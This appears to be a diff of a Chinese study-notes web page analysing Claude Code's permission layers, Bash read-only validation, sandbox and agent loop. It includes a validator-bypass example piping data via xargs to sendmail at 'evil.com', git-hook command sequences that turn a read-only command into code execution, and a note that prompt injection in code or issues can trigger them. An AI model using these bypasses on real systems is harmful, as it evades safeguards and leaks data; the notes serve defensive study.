@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>苏格拉底 01 · 安全体系与 Agent 循环 — Claude Code 源码学习笔记</title>
+<title>专题 01 · 安全与 Agent 循环 — Claude Code 源码学习笔记</title>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
 
@@ -50,7 +50,7 @@ body{animation:flicker 8s infinite}
 .ls-table tr:hover:not(.active) td{background:rgba(0,230,118,.07);color:var(--green);cursor:pointer}
 .ls-table tr:hover:not(.active) a{color:var(--green)}
 .phase-label{font-size:11px}
-.phase-a{color:#69ff9c}.phase-b{color:#40c8ff}.phase-c{color:#ffd740}.phase-p{color:#ff80ab}.phase-s{color:#ff9100}
+.phase-a{color:#69ff9c}.phase-b{color:#40c8ff}.phase-c{color:#ffd740}.phase-s{color:#ce93d8}.phase-p{color:#ff80ab}
 .sidebar-footer{padding:10px 16px;color:var(--green-dim);font-size:11px;border-top:1px dashed var(--border);flex-shrink:0}
 
 /* main */
@@ -88,12 +88,6 @@ body{animation:flicker 8s infinite}
 .table-wrap th{padding:6px 14px;color:var(--green);border-bottom:1px solid var(--green-dim);text-align:left;letter-spacing:1px;font-size:10px;text-transform:uppercase}
 .table-wrap td{padding:6px 14px;color:var(--green-dim);border-bottom:1px dashed var(--border)}
 .table-wrap tr:hover td{background:rgba(0,230,118,.04)}
-
-/* checklist */
-.checklist{list-style:none;padding-left:4px;margin-bottom:16px;font-size:13px}
-.checklist li{margin-bottom:4px;line-height:1.7;color:var(--green-dim)}
-.checklist li::before{content:'[x] ';color:var(--green)}
-.checklist li.unchecked::before{content:'[ ] ';color:var(--green-dim)}
 
 /* status bar */
 .statusbar{border-top:1px dashed var(--border);padding:5px 28px;display:flex;justify-content:space-between;font-size:11px;color:var(--green-dim);background:var(--bg2);flex-shrink:0;white-space:nowrap}
@@ -160,7 +154,7 @@ body{animation:flicker 8s infinite}
  ╚██████╗███████╗██║  ██║╚██████╔╝██████╔╝███████╗    ╚██████╗╚██████╔╝██████╔╝███████╗
   ╚═════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝</pre>
 <div class="header-meta">
-  <span class="typed">Last updated: 2026-04-01 &nbsp;|&nbsp; claude-code main branch</span>
+  <span class="typed">Last updated: 2026-03-31 &nbsp;|&nbsp; claude-code main branch</span>
   <span style="display:flex;align-items:center;gap:12px">
     <button class="menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('open')">[MENU]</button>
     <span>[STUDY NOTES v1.0]</span>
@@ -171,7 +165,7 @@ body{animation:flicker 8s infinite}
 <div class="layout">
   <nav class="sidebar">
     <div class="sidebar-scroll">
-
+      
     <div class="prompt"><b>guest@claude-study</b>:~/notes$ ls<span class="cursor"></span></div>
     <table class="ls-table">
       <thead><tr><th>PERMS</th><th>NAME</th></tr></thead>
@@ -208,6 +202,9 @@ body{animation:flicker 8s infinite}
       </tr><tr class="file">
         <td>-rw-r--r--</td>
         <td><a href="task-12-reflection.html">Task 12 · 复盘总结</a></td>
+      </tr><tr class="dir"><td></td><td class="phase-label phase-s">苏格拉底专题/</td></tr><tr class="active">
+        <td>-rw-r--r--</td>
+        <td><a href="socratic-01-security-and-agent-loop.html">专题 01 · 安全与 Agent 循环</a></td>
       </tr><tr class="dir"><td></td><td class="phase-label phase-p">模式卡片/</td></tr><tr class="file">
         <td>-rw-r--r--</td>
         <td><a href="patterns.html">模式卡片总览</a></td>
@@ -241,241 +238,285 @@ body{animation:flicker 8s infinite}
       </tr><tr class="file">
         <td>-rw-r--r--</td>
         <td><a href="pattern-10.html">10 · 上下文压缩</a></td>
-      </tr><tr class="dir"><td></td><td class="phase-label phase-s">苏格拉底专题/</td></tr><tr class="active">
-        <td>-rw-r--r--</td>
-        <td><a href="socratic-01-security-and-agent-loop.html">01 · 安全与 Agent 循环</a></td>
       </tr></tbody>
     </table>
-
+  
     </div>
     <div class="sidebar-footer">23 files found.</div>
   </nav>
 
   <main class="main">
     <div class="page-prompt">
-      <b>guest@claude-study</b>:~/notes/socratic$ <span style="color:var(--green)">cat socratic-01.md</span>
+      <b>guest@claude-study</b>:~/notes/superpowers$ <span style="color:var(--green)">cat socratic-01-security-and-agent-loop.md</span>
     </div>
     <div class="content">
       <h1>苏格拉底专题 01：安全体系与 Agent 循环</h1>
-
+<blockquote>
+<p>学习方式：苏格拉底对话法（问答驱动、逐步发现）
+日期：2026-04-01
+覆盖主题：权限系统五层防御、Bash AST 安全分析、OS 沙箱、Agent 循环状态机、工具并发控制</p>
+</blockquote>
+<hr>
 <h2>第一部分：权限系统——五层防御模型</h2>
-
 <h3>核心设计问题：谁来决定一个工具调用是否安全？</h3>
-
-<p>模型既是工具的调用者，也是任务的执行者。让模型自己判断操作安不安全不可靠（幻觉问题），因此安全判断必须由<strong>系统规则 + 用户确认</strong>共同完成。</p>
-
-<h3>五层防御总览</h3>
-
-<div class="table-wrap"><table><thead><tr>
-<th>层</th>
-<th>机制</th>
-<th>思路</th>
-</tr></thead><tbody>
-<tr><td>1</td><td>工具静态分类</td><td>只读工具直接放行</td></tr>
-<tr><td>2</td><td>Bash AST 分析</td><td>解析命令结构，fail-closed 白名单</td></tr>
-<tr><td>3</td><td>权限规则匹配</td><td>exact / prefix / wildcard 三级粒度</td></tr>
-<tr><td>4</td><td>用户交互确认</td><td>以上都无法判断时才问用户</td></tr>
-<tr><td>5</td><td>OS 沙箱</td><td>最后一道兜底（opt-in）</td></tr>
-</tbody></table></div>
-
-<h3>第二层：Bash AST 分析</h3>
-
-<p>核心文件：<code>src/utils/bash/ast.ts</code></p>
-
-<p>把 bash 命令解析成 AST，在语法树层面判断危险性。关键设计——<strong>fail-closed（失败即关闭）</strong>：</p>
-
-<ul>
-<li>白名单里的节点 → 逐个分析，放行已知安全的</li>
-<li><code>DANGEROUS_TYPES</code> 里的 → 直接标记危险</li>
-<li>两者都不在的未知节点 → 也当作危险处理</li>
-</ul>
-
-<div class="code-block"><pre>const DANGEROUS_TYPES = new Set([
-  'command_substitution', 'process_substitution',
-  'subshell', 'for_statement', 'while_statement',
-  'if_statement', 'case_statement', 'function_definition',
-  'test_command', 'ansi_c_string', ...
-])</pre></div>
-
+<p>在 Claude Code 中，模型既是工具的调用者，也是任务的执行者。让模型自己判断操作安不安全不可靠（幻觉问题），因此安全判断必须由<strong>系统规则 + 用户确认</strong>共同完成，而非依赖模型。</p>
+<h3>第一层：工具静态分类</h3>
+<p>每个工具天生有&quot;只读&quot;或&quot;可写&quot;的属性。<code>FileReadTool</code> 读文件无破坏性，可直接放行；<code>BashTool</code> 能执行任意命令，需要进一步分析。</p>
+<h3>第二层：Bash AST 分析（fail-closed 白名单）</h3>
+<p><strong>核心文件</strong>：<code>src/utils/bash/ast.ts</code></p>
+<p>不是字符串匹配，而是把 bash 命令解析成 AST（抽象语法树），在语法树层面判断危险性。</p>
+<p>关键设计——<strong>fail-closed（失败即关闭）</strong>：</p>
+<div class="code-block"><pre>白名单里的节点 → 逐个分析，放行已知安全的
+DANGEROUS_TYPES 里的 → 直接标记危险
+两者都不在的未知节点 → 也当作危险处理（too-complex）</pre></div><p><code>DANGEROUS_TYPES</code> 包含 <code>command_substitution</code>、<code>process_substitution</code>、<code>subshell</code>、<code>for_statement</code>、<code>while_statement</code>、<code>if_statement</code>、<code>function_definition</code> 等 18 种 AST 节点类型。</p>
 <p><strong>为什么比黑名单好？</strong> 黑名单漏掉一个危险命令就完了；白名单漏掉的东西默认被拦截。</p>
-
-<h3>第三层：权限规则三级粒度</h3>
-
-<p>核心文件：<code>src/utils/permissions/shellRuleMatching.ts</code></p>
-
+<h3>第三层：权限规则匹配（三级粒度）</h3>
+<p><strong>核心文件</strong>：<code>src/utils/permissions/shellRuleMatching.ts</code></p>
 <div class="code-block"><pre>type ShellPermissionRule =
-  | { type: 'exact',    command: string }   // "npm test"
-  | { type: 'prefix',   prefix: string }    // "npm:*"
-  | { type: 'wildcard', pattern: string }   // "git commit -m *"</pre></div>
-
-<p>前缀匹配是「最小授权」和「实用性」之间的平衡点。</p>
-
-<h3>第五层：OS 沙箱</h3>
-
-<p>核心文件：<code>src/utils/sandbox/sandbox-adapter.ts</code></p>
-
+  | { type: 'exact',    command: string }   // 精确匹配："npm test"
+  | { type: 'prefix',   prefix: string }    // 前缀匹配："npm:*"
+  | { type: 'wildcard', pattern: string }   // 通配符："git commit -m *"</pre></div><p>在「最小授权」和「实用性」之间的平衡——前缀匹配 <code>npm:*</code> 意味着信任所有 npm 命令，比逐条授权方便，又比开放所有 bash 安全。</p>
+<h3>第四层：用户交互确认</h3>
+<p>以上规则都无法判断时，才弹出交互确认让用户决定。</p>
+<h3>第五层：OS 沙箱（opt-in）</h3>
+<p><strong>核心文件</strong>：<code>src/utils/sandbox/sandbox-adapter.ts</code>、<code>src/entrypoints/sandboxTypes.ts</code></p>
 <div class="table-wrap"><table><thead><tr>
 <th>平台</th>
 <th>机制</th>
-</tr></thead><tbody>
-<tr><td>macOS</td><td>seatbelt（sandbox-exec）</td></tr>
-<tr><td>Linux</td><td>seccomp + bubblewrap</td></tr>
-</tbody></table></div>
-
-<p><strong>关键发现：沙箱默认关闭</strong>（<code>settings?.sandbox?.enabled ?? false</code>）。原因是可用性——沙箱会导致 <code>npm install</code> 等常见操作直接失败。</p>
-
-<p>配置后 <code>autoAllowBashIfSandboxed</code> 可自动放行 bash——沙箱接管安全职责后，权限确认就可以放松。</p>
-
+</tr>
+</thead><tbody><tr>
+<td>macOS</td>
+<td>seatbelt（sandbox-exec）</td>
+</tr>
+<tr>
+<td>Linux</td>
+<td>seccomp + bubblewrap</td>
+</tr>
+</tbody></table></div><p>通过 <code>@anthropic-ai/sandbox-runtime</code> 统一封装，支持三类限制：</p>
+<div class="table-wrap"><table><thead><tr>
+<th>限制类型</th>
+<th>说明</th>
+</tr>
+</thead><tbody><tr>
+<td><code>FsReadRestrictionConfig</code></td>
+<td>限制可读路径</td>
+</tr>
+<tr>
+<td><code>FsWriteRestrictionConfig</code></td>
+<td>限制可写路径</td>
+</tr>
+<tr>
+<td><code>NetworkRestrictionConfig</code></td>
+<td>限制网络访问（按域名模式）</td>
+</tr>
+</tbody></table></div><p><strong>关键发现：沙箱默认关闭</strong>（<code>settings?.sandbox?.enabled ?? false</code>）。原因是开箱即用的可用性——沙箱会导致 <code>npm install</code> 等常见操作直接失败。安全交给前四层，沙箱是高安全需求的 opt-in 能力。</p>
+<p>配置示例：</p>
+<div class="code-block"><pre>{
+  "sandbox": {
+    "enabled": true,
+    "autoAllowBashIfSandboxed": true,  // 沙箱内 bash 自动放行
+    "filesystem": {
+      "allowWrite": ["/tmp/my-builds"],
+      "denyRead": ["~/.ssh"]
+    },
+    "network": {
+      "allowedDomains": ["registry.npmjs.org"]
+    }
+  }
+}</pre></div><p>巧妙设计：<code>autoAllowBashIfSandboxed</code> 开启后，沙箱接管安全职责，权限确认就可以放松——安全和体验的平衡。</p>
 <hr>
-
 <h2>第二部分：只读判断深潜</h2>
-
-<h3>flag 级白名单</h3>
-
-<p>核心文件：<code>src/tools/BashTool/readOnlyValidation.ts</code></p>
-
+<h3>isCommandReadOnly：flag 级白名单</h3>
+<p><strong>核心文件</strong>：<code>src/tools/BashTool/readOnlyValidation.ts</code></p>
+<p>只读判断不是命令级，而是<strong>flag 级</strong>：</p>
 <div class="code-block"><pre>const COMMAND_ALLOWLIST = {
   xargs: {
     safeFlags: {
-      '-I': '{}',
-      '-n': 'number',
-      '-0': 'none',
-      // -i 和 -e 被移除！
+      '-I': '{}',       // 安全，接受一个替换符
+      '-n': 'number',   // 安全，接受数字
+      '-0': 'none',     // 安全，无参数
+      // -i 和 -e 被移除！GNU 可选参数语义导致安全漏洞
     }
   },
-  sed: { safeFlags: { '--quiet': 'none', ... } },
+  sed: { safeFlags: { '--quiet': 'none', '-n': 'none', ... } },
+  sort: { ... },
   ...GIT_READ_ONLY_COMMANDS,
-}</pre></div>
-
-<h3>xargs -i 漏洞案例</h3>
-
+}</pre></div><p>每个 flag 标注参数类型（<code>none</code>、<code>number</code>、<code>string</code>、<code>char</code>），验证参数合法性。</p>
+<h3>xargs <code>-i</code> 漏洞案例</h3>
 <div class="code-block"><pre>echo /usr/sbin/sendm | xargs -it tail a@evil.com
-# 验证器以为：-i 和 t 是两个 flag
+# 验证器以为：-i 和 t 是两个 flag，tail 在安全目标里 → 放行
 # GNU xargs 实际：-i 的 replace-str=t，tail 成为目标命令
-# → /usr/sbin/sendmail → 网络数据泄露</pre></div>
-
-<h3>git hooks 攻击向量</h3>
-
+# → /usr/sbin/sendmail → 网络数据泄露</pre></div><h3>git hooks 攻击向量</h3>
 <p><code>git status</code> 是只读命令，但 git 执行前会跑 hooks——hooks 可执行任意代码。</p>
-
-<p>三种攻击场景：</p>
+<p>代码防了三种攻击：</p>
 <ol>
-<li><code>cd /malicious/dir &amp;&amp; git status</code> — 触发恶意 hooks</li>
-<li>裸仓库伪造 — 删 <code>.git/HEAD</code>，当前目录放 <code>hooks/pre-commit</code></li>
-<li>先写后执行 — <code>mkdir -p hooks &amp;&amp; echo 'malicious' &gt; hooks/pre-commit &amp;&amp; git status</code></li>
+<li><strong>cd + git</strong>：<code>cd /malicious/dir &amp;&amp; git status</code> → 触发恶意目录下的 hooks</li>
+<li><strong>裸仓库伪造</strong>：删掉 <code>.git/HEAD</code>，在当前目录放 <code>hooks/pre-commit</code></li>
+<li><strong>先写后执行</strong>：<code>mkdir -p hooks &amp;&amp; echo &#39;malicious&#39; &gt; hooks/pre-commit &amp;&amp; git status</code></li>
 </ol>
-
-<p>攻击者不需要是内鬼——通过 <strong>prompt injection</strong>，在代码、PR、issue 中嵌入指令即可。</p>
-
+<p>攻击者不需要是内鬼——通过 prompt injection，在代码、PR、issue 中嵌入&quot;指令&quot;，模型读到后可能照做。</p>
 <h3>完整只读判断链</h3>
-
 <div class="code-block"><pre>命令能解析吗？
   → 有未展开的变量/通配符吗？
     → 命令名在白名单里吗？
       → 每个 flag 都在 safeFlags 里吗？
         → flag 的参数类型匹配吗？
-          → 全部通过 → readOnly = true
-任何一步失败 → false（fail-closed）</pre></div>
-
+          → 全部通过 → readOnly = true</pre></div><p>任何一步失败都返回 false——fail-closed。</p>
 <hr>
-
 <h2>第三部分：Agent 循环——状态机</h2>
-
 <h3>基本结构</h3>
-
-<p>核心文件：<code>src/query.ts</code></p>
-
-<p><code>query()</code> 是 <code>AsyncGenerator</code>（<code>async function*</code>），用 <code>while(true)</code> 驱动。AsyncGenerator 让每个事件实时 yield 给调用方，实现流式渲染。</p>
-
+<p><strong>核心文件</strong>：<code>src/query.ts</code></p>
+<p><code>query()</code> 是一个 <code>AsyncGenerator</code>（<code>async function*</code>），用 <code>while(true)</code> 循环驱动。使用 AsyncGenerator 而非普通 async function，是因为需要<strong>实时流式输出</strong>——每产出一个事件就 yield，调用方逐个消费、实时渲染到终端。</p>
 <h3>状态定义</h3>
-
 <div class="code-block"><pre>type State = {
   messages: Message[]
   turnCount: number
-  transition: Continue | undefined
+  transition: Continue | undefined  // 上一轮为什么继续
   hasAttemptedReactiveCompact: boolean
   maxOutputTokensRecoveryCount: number
+  maxOutputTokensOverride: number | undefined
   // ...
-}</pre></div>
-
-<h3>退出原因三类</h3>
-
+}</pre></div><p>每轮结束构造新 State，赋值后回到循环顶部，根据状态决定下一轮行为。</p>
+<h3>11+ 种退出原因（三类）</h3>
 <div class="table-wrap"><table><thead><tr>
 <th>类别</th>
 <th>reason</th>
 <th>说明</th>
-</tr></thead><tbody>
-<tr><td>正常结束</td><td>completed</td><td>模型说完了</td></tr>
-<tr><td></td><td>aborted_streaming</td><td>用户中断（streaming）</td></tr>
-<tr><td></td><td>aborted_tools</td><td>用户中断（工具执行）</td></tr>
-<tr><td></td><td>hook_stopped</td><td>Hook 阻止</td></tr>
-<tr><td>异常退出</td><td>prompt_too_long</td><td>上下文超长</td></tr>
-<tr><td></td><td>model_error</td><td>API 报错</td></tr>
-<tr><td></td><td>blocking_limit</td><td>速率限制</td></tr>
-<tr><td>自救转换</td><td>reactive_compact_retry</td><td>压缩后重试</td></tr>
-<tr><td></td><td>max_output_tokens_escalate</td><td>调高 token 上限</td></tr>
-<tr><td></td><td>next_turn</td><td>正常下一轮</td></tr>
-</tbody></table></div>
-
-<p>自救用 <code>transition</code>（不退出循环），异常用 <code>return</code>（退出循环）。</p>
-
-<hr>
-
+</tr>
+</thead><tbody><tr>
+<td>正常结束</td>
+<td><code>completed</code></td>
+<td>模型说完了（end_turn）</td>
+</tr>
+<tr>
+<td></td>
+<td><code>aborted_streaming</code></td>
+<td>用户中断（streaming 阶段）</td>
+</tr>
+<tr>
+<td></td>
+<td><code>aborted_tools</code></td>
+<td>用户中断（工具执行阶段）</td>
+</tr>
+<tr>
+<td></td>
+<td><code>hook_stopped</code> / <code>stop_hook_prevented</code></td>
+<td>Hook 阻止</td>
+</tr>
+<tr>
+<td>异常退出</td>
+<td><code>prompt_too_long</code></td>
+<td>上下文超长</td>
+</tr>
+<tr>
+<td></td>
+<td><code>image_error</code></td>
+<td>图片处理出错</td>
+</tr>
+<tr>
+<td></td>
+<td><code>model_error</code></td>
+<td>API 调用报错</td>
+</tr>
+<tr>
+<td></td>
+<td><code>blocking_limit</code></td>
+<td>速率限制</td>
+</tr>
+<tr>
+<td>自救转换</td>
+<td><code>reactive_compact_retry</code></td>
+<td>压缩上下文后重试</td>
+</tr>
+<tr>
+<td></td>
+<td><code>max_output_tokens_escalate</code></td>
+<td>调高 token 上限重试</td>
+</tr>
+<tr>
+<td></td>
+<td><code>collapse_drain_retry</code></td>
+<td>折叠内容后重试</td>
+</tr>
+<tr>
+<td></td>
+<td><code>token_budget_continuation</code></td>
+<td>token 预算内继续</td>
+</tr>
+<tr>
+<td></td>
+<td><code>next_turn</code></td>
+<td>正常下一轮</td>
+</tr>
+</tbody></table></div><p>自救转换用 <code>transition</code> 而非 <code>return</code>——不退出循环，切换状态后继续。</p>
+<h3>循环无限防护</h3>
+<p>不做循环检测，用更可靠的 <code>maxTurns</code> 硬上限：</p>
+<div class="code-block"><pre>if (maxTurns &amp;&amp; nextTurnCount &gt; maxTurns) {
+  return { reason: 'max_turns', turnCount: nextTurnCount }
+}</pre></div><hr>
 <h2>第四部分：工具并发控制</h2>
-
-<h3>isConcurrencySafe</h3>
-
-<p>核心文件：<code>src/services/tools/StreamingToolExecutor.ts</code></p>
-
-<div class="code-block"><pre>canExecuteTool(isConcurrencySafe: boolean): boolean {
+<h3>isConcurrencySafe：工具自声明</h3>
+<p><strong>核心文件</strong>：<code>src/services/tools/StreamingToolExecutor.ts</code></p>
+<p>不是系统层面按「读/写」分，而是每个工具自己声明并发安全性：</p>
+<div class="code-block"><pre>private canExecuteTool(isConcurrencySafe: boolean): boolean {
   const executingTools = this.tools.filter(t =&gt; t.status === 'executing')
   return (
     executingTools.length === 0 ||
     (isConcurrencySafe &amp;&amp; executingTools.every(t =&gt; t.isConcurrencySafe))
   )
-}</pre></div>
-
+}</pre></div><p>规则：</p>
+<ul>
+<li>并发安全的工具之间 → 可以并行</li>
+<li>任何非并发安全的工具 → 独占执行</li>
+</ul>
 <h3>BashTool 的动态判断</h3>
-
 <div class="code-block"><pre>isConcurrencySafe(input) {
   return this.isReadOnly?.(input) ?? false;
-}</pre></div>
-
-<p><code>bash("ls")</code> → 只读 → 可并发；<code>bash("npm install")</code> → 非只读 → 独占。</p>
-
-<p>工具自声明比全局「读/写」分类更精确——两个写不同文件的操作可以安全并行，两个 <code>npm install</code> 却会冲突。</p>
-
+}</pre></div><p>BashTool 不是静态声明安全性，而是<strong>每次调用时</strong>判断具体命令是否只读。<code>bash(&quot;ls&quot;)</code> → 只读 → 可并发；<code>bash(&quot;npm install&quot;)</code> → 非只读 → 独占。</p>
+<p><strong>为什么不用全局「读/写」分类？</strong> 因为粒度太粗——两个写不同文件的 <code>FileWriteTool</code> 可以安全并行，两个 <code>BashTool(&quot;npm install&quot;)</code> 同时跑却会冲突。工具的作者最清楚自己的并发风险。</p>
 <hr>
-
-<h2>关键设计原则</h2>
-
+<h2>关键设计原则总结</h2>
 <div class="table-wrap"><table><thead><tr>
 <th>原则</th>
 <th>体现</th>
-</tr></thead><tbody>
-<tr><td>Fail-closed</td><td>AST 白名单、只读判断链</td></tr>
-<tr><td>分层防御</td><td>五层各有不同安全/体验平衡点</td></tr>
-<tr><td>安全 vs 体验</td><td>沙箱 opt-in、autoAllowBashIfSandboxed</td></tr>
-<tr><td>自声明优于全局规则</td><td>isConcurrencySafe 由工具自己决定</td></tr>
-<tr><td>状态机驱动</td><td>Agent 循环的 transition</td></tr>
-<tr><td>流式优先</td><td>AsyncGenerator 实时输出</td></tr>
-</tbody></table></div>
-
-<hr>
-
+</tr>
+</thead><tbody><tr>
+<td><strong>Fail-closed</strong></td>
+<td>AST 白名单、只读判断链——未知即拒绝</td>
+</tr>
+<tr>
+<td><strong>分层防御</strong></td>
+<td>五层各有不同安全/体验平衡点</td>
+</tr>
+<tr>
+<td><strong>安全 vs 体验</strong></td>
+<td>沙箱 opt-in、<code>autoAllowBashIfSandboxed</code>、前缀匹配</td>
+</tr>
+<tr>
+<td><strong>自声明优于全局规则</strong></td>
+<td><code>isConcurrencySafe</code> 由工具自己决定</td>
+</tr>
+<tr>
+<td><strong>状态机驱动</strong></td>
+<td>Agent 循环的 transition 实现自救与恢复</td>
+</tr>
+<tr>
+<td><strong>流式优先</strong></td>
+<td>AsyncGenerator 实现实时输出</td>
+</tr>
+</tbody></table></div><hr>
 <h2>学习进度</h2>
-
-<ul class="checklist">
-<li>权限系统五层防御模型</li>
-<li>Bash AST 安全分析与 fail-closed 策略</li>
-<li>权限规则三级粒度</li>
-<li>OS 沙箱机制与配置</li>
-<li>只读判断深潜（flag 级白名单、git hooks 攻击）</li>
-<li>Agent 循环状态机</li>
-<li>工具并发控制</li>
-<li class="unchecked">多智能体架构</li>
-<li class="unchecked">上下文管理与压缩</li>
-<li class="unchecked">插件/技能系统</li>
+<ul>
+<li><input checked="" disabled="" type="checkbox"> 权限系统五层防御模型</li>
+<li><input checked="" disabled="" type="checkbox"> Bash AST 安全分析与 fail-closed 策略</li>
+<li><input checked="" disabled="" type="checkbox"> 权限规则三级粒度（exact / prefix / wildcard）</li>
+<li><input checked="" disabled="" type="checkbox"> OS 沙箱机制与配置</li>
+<li><input checked="" disabled="" type="checkbox"> 只读判断深潜（flag 级白名单、git hooks 攻击）</li>
+<li><input checked="" disabled="" type="checkbox"> Agent 循环状态机</li>
+<li><input checked="" disabled="" type="checkbox"> 工具并发控制（isConcurrencySafe）</li>
+<li><input disabled="" type="checkbox"> 多智能体架构</li>
+<li><input disabled="" type="checkbox"> 上下文管理与压缩</li>
+<li><input disabled="" type="checkbox"> 插件/技能系统</li>
 </ul>
 
     </div>
@@ -484,7 +525,7 @@ body{animation:flicker 8s infinite}
 
 <footer class="statusbar">
   <span>[MODE: NORMAL] &nbsp; [ENCODING: UTF-8] &nbsp; [BRANCH: main]</span>
-  <span>&copy; 2026 &nbsp;<b>claude-code-study</b></span>
+  <span>© 2026 &nbsp;<b>claude-code-study</b></span>
 </footer>
 
 </body>
